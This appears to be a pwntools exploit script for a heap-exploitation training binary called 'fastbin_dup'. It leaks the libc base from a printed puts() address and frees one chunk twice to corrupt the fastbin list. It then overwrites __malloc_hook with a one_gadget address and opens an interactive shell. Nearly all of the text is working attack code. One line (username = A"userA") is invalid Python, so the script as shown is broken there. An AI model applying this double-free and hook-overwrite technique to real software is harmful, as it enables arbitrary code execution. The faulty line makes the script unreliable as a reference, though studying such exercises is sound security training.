#!/usr/bin/python3
from pwn import *

elf = context.binary = ELF("fastbin_dup")
libc = ELF(elf.runpath + b"/libc.so.6")  # Updated path to libc

gdb_script = '''
continue
'''

def launch():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdb_script)
    else:
        return process(elf.path)

# Counter for allocated chunks.
chunk_counter = 0

# Choose the "malloc" option; send the size and data.
# Returns the chunk index.
def allocate(size, content):
    global chunk_counter
    io.sendline(b"1")
    io.sendafter(b"size: ", str(size).encode())
    io.sendafter(b"data: ", content)
    io.recvuntil(b"> ")
    chunk_counter += 1
    return chunk_counter - 1

# Choose the "free" option; send the chunk index.
def release(index):
    io.sendline(b"2")
    io.sendafter(b"index: ", str(index).encode())
    io.recvuntil(b"> ")

io = launch()

io.recvuntil(b"puts() @ ")
libc.address = int(io.recvline().strip(), 16) - libc.sym.puts
io.timeout = 0.1



username = A"userA"
io.sendafter(b"username: ", username)
io.recvuntil(b"> ")


dup_chunk = allocate(0x68, b"A"*8)
safety_chunk = allocate(0x68, b"B"*8)


release(dup_chunk)
release(safety_chunk)
release(dup_chunk)


allocate(0x68, p64(libc.sym.__malloc_hook - 0x23))


allocate(0x68, b"C"*8)
allocate(0x68, b"D"*8)


allocate(0x68, b"X"*0x13 + p64(libc.address + 0xe1fa1))  # [rsp+0x50] == NULL


allocate(0x18, b"")


io.interactive()

